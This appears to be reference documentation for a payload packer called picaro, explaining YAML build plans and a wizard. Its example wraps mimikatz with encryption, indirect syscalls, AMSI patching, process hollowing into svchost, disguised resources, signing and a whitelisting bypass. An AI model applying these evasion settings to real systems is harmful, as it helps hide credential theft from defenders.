# Plan reference

Every block of a schema-6 document, plus the interactive wizard that writes one.
For a guided walk-through, start with [Getting started](getting-started.md).
To compose a plan in the browser — several payloads, technique knobs filled from
the registry — use the [Plan builder](/plan-builder/).

## Plan

A build is one YAML document. Strict by design: unknown keys are an error, so
typos surface immediately instead of silently doing nothing.

```yaml
schema: 6                 # only version 6 is accepted
name: mimikatz-basic

build:
  crypto:                 # default crypto for every payload
    algo: xchacha20poly1305
    key: random
  payloads:               # named payloads, loaded by an execution step
    mimikatz:
      source: ./payload.exe # a local path, or an http(s):// URL (fetched in memory)
      format: pe            # pe | shellcode | dll | dotnet
      export: null          # format: dll only: the exported function to call
      args: []              # fixed args for the payload, before the runtime ones
      args_mode: join       # join | override
      sha256: null          # optional: pin the input's SHA-256 (64 hex chars)
      # crypto: { ... }       # optional: override build.crypto for this payload
  stub:
    path: null            # null = builtin stub; or a path to a custom .rs
    syscalls:
      mode: indirect      # none | indirect
      resolver: hells_gate  # hells_gate | tartarus_gate | api_hash
    api_resolution:       # optional: serve selected payload imports from the loader
      mode: none          # none | proxy (proxy needs syscalls: indirect + pe/dll)
      apis: []            # catalogue entries, e.g. "kernel32!ReadProcessMemory"
      unmatched: forward  # forward | abort
    strings:
      strategy: xor       # xor | stack
      key: random         # random | literal:<64 hex chars>
    debug: false          # compile a debuggable, non-evasive stub for the lab
  output:
    path: ./dist/mimikatz_packed.exe
    kind: exe             # exe | dll (a DLL a host process loads; see below)
    entry: auto           # DLL only: auto | jni_on_load | export:<name>
    arch: x64             # x64 | x86 (default x64; the stub and the payload must match)
    strip: true           # default true: drop the symbol/debug tables
    trim_paths: all       # all | none | relative (default all: scrub absolute build paths)
    manifest: true        # write <stem>.manifest.json (provenance)
    subsystem: console    # console | windows (GUI; no console window)
    resources:            # optional PE resources (no rc.exe/windres needed)
      icon: ./app.ico     # a .ico path, or "random" to generate one
      version_info:
        randomize: true    # fill unset fields with generated values
        company: "Contoso" # explicit fields always win
      manifest:
        level: as_invoker # as_invoker | highest_available | require_administrator
        dpi_aware: true
    sign:                 # optional Authenticode signing
      mode: lab           # none | lab | store | file

runtime:                  # ordered technique steps
  - technique: patch_amsi
  - technique: process_hollowing
    params:
      payload: mimikatz   # which payload to run (implicit when there is one)
      target: "C:\\Windows\\System32\\svchost.exe"
```

| Block | What it decides |
| --- | --- |
| `build.crypto` | Default payload encryption (XChaCha20-Poly1305, 24-byte nonce, fresh random key per build). A payload may override it with its own `crypto` block; with neither, encryption defaults to XChaCha20-Poly1305 with a random key. |
| `build.payloads.<name>.source` | The input to pack: a local path, or an `http(s)://` or `file://` URL (`http(s)` is fetched in memory, never written to disk). |
| `build.payloads.<name>.format` | `pe` (default), `dll`, `shellcode` or `dotnet` (a managed assembly). Decides how the input is validated and how the Execution technique runs it. |
| `build.payloads.<name>.export` | For `format: dll`, the exported function to call (e.g. `Run`). Without it only `DllMain(DLL_PROCESS_ATTACH)` runs. |
| `build.payloads.<name>.args` / `args_mode` | Fixed arguments handed to the payload (`join` = YAML args then the packed binary's own; `override` = runtime args replace the YAML ones). |
| `build.payloads.<name>.sha256` | Optional SHA-256 of the input. A mismatch aborts before anything is encrypted, so a URL (or a swapped file) cannot silently change what gets packed. |
| `build.stub.strings` | How every runtime literal in the stub is obfuscated (`xor` or `stack`). Defaults to `xor` + random key, with a warning. |
| `build.stub.api_resolution` | Serve selected payload imports (`apis`) from proxies generated in the loader instead of the real exports (`mode: proxy`). Needs `syscalls.mode: indirect` and a `pe`/`dll` payload; not usable with `process_hollowing`. |
| `build.stub.debug` | Compile a debuggable stub: no hardening, source paths kept, techniques log to stderr. Markedly less evasive — for the lab, never for delivery. |
| `build.stub` | The stub itself: a custom template (`path`, `null` = builtin), the syscall layer (`syscalls`), API resolution (`api_resolution`) and string obfuscation (`strings`). |
| `build.output` | Where the packed artifact goes and how it is finalized. `arch` selects the stub's architecture (`x64` or `x86`) and the payload must match it. `manifest` writes the provenance file. |
| `build.output.kind` | `exe` (default) or `dll`. A DLL the host process loads — a JVM (`System.load`), CPython (`ctypes`), .NET (`[DllImport]`), `rundll32` — which is what makes the chain usable where application whitelisting only allows the host program. `entry` picks the exports: `auto`, `jni_on_load` or `export:<name>`. See [DLL output design](design/dll-output.md). |
| `build.output.subsystem` | `console` (default) or `windows` (GUI, no console window). |
| `build.output.resources` | Optional PE resources embedded into the artifact: `icon` (a `.ico` path or `random`), `version_info` and `manifest` (Windows app manifest / UAC). Built in Rust and written into a `.rsrc` section. |
| `build.output.sign` | Optional Authenticode signing: `lab` (self-signed), `store` (an existing cert, Windows only) or `file` (a `.pfx`). Uses `signtool` on Windows and `osslsigncode` elsewhere. |
| `runtime` | The ordered technique steps. Only Execution techniques (`reflective_loading`, `process_hollowing`, `pe_injection`, `early_bird`, `thread_hijacking`, `dll_hollowing`, `process_ghosting`, `dotnet_hosting`, `execution_callbacks`, `module_stomping`, `fibers`) take `params.payload` (optional with one payload, required with several); Preparation and Control steps never do. A technique's parameters go under a nested `params:` mapping, and each step carries the loader's own `on_success`/`on_fail`/`delay_ms`. See [Runtime steps](multistage.md). |

**Build arguments.** Positional args after the plan path are substituted in
the YAML as `$arg.N$` (0-based); an arg of the form `name=value` is available
as `$arg.name$`. One plan can target several hosts:

```bash
picaro build plan.yaml "C:\\Windows\\System32\\svchost.exe"
```

```yaml
runtime:
  - technique: process_hollowing
    params:
      target: "$arg.0$"
```

A referenced-but-missing argument is a clear error, not a silent empty string.

### Interactive build

Rather than writing the YAML by hand, answer a few questions and let the packer
write it for you:

```bash
picaro build interactive mimikatz.exe
```

The wizard walks through the payload (name, runtime args), the techniques (one
Execution plus any Preparation, each with its own parameters), the stub
(`strings`, `syscalls`) and the output, then prints the resulting document and
writes it. The YAML is the source of truth: the build runs from the file it just
wrote, so re-running `picaro build dist/mimikatz.yaml` reproduces the artifact
with no prompts. `--plan-out <path>` picks where the YAML lands (default
`dist/<name>.yaml`).

The wizard is a form, not a list of numbered prompts: arrow keys move through
single-choice menus, the spacebar toggles checkboxes on multi-selects, and `Esc`
cancels. When you finish, a **review** screen shows the YAML it will write and
lets you **build now**, **edit answers** (re-ask with your previous answers as
the defaults, so a mistake is one cursor move away, never a restart) or **quit**.

Generated plans pass through the same validation as hand-written ones, so they
are never the reason a build fails. Questions cover the common path only: a
literal `strings.key`, a custom `build.stub.path`, `args_mode: override` or
non-default `sleep_obfuscation` regions are one edit away in the written file.
The fancy prompts require a real terminal; when stdin or stdout is redirected
(e.g. a pipe or a script) the wizard falls back to plain line prompts.
